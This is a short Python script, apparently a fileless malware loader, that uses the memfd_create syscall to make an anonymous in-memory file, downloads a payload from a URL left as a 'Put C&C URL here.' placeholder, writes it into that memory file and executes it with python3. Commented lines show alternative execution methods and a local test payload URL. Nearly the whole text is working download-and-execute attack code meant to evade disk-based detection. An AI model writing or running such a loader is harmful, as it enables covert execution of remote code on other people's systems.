#! /usr/bin/python3

import ctypes
import ctypes.util
import os
import time
import subprocess
import urllib.request 

def send_payload(url):
    libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))
    memfd = libc.syscall(319,b'aqeeb', 1)
    assert memfd >= 0
    pid = os.getpid()
    print("Process PID", pid)
    print(memfd)
#time.sleep(30)

    response = urllib.request.urlopen(url).read()

    with open("/proc/{}/fd/{}".format(pid, memfd), mode='wb') as f1:
     #   f1.write(requests.get('http://127.0.0.1:8000/payload.py').content)
        f1.write(response)

#os.execv('/proc/{}/fd/{}'.format(pid, memfd), [" "])
#subprocess.Popen(['/proc/{}/fd/{}'.format(pid, memfd)])

    print("Executing payload...")
    os.system('python3 /proc/{}/fd/{}'.format(pid, memfd))

send_payload('Put C&C URL here.')
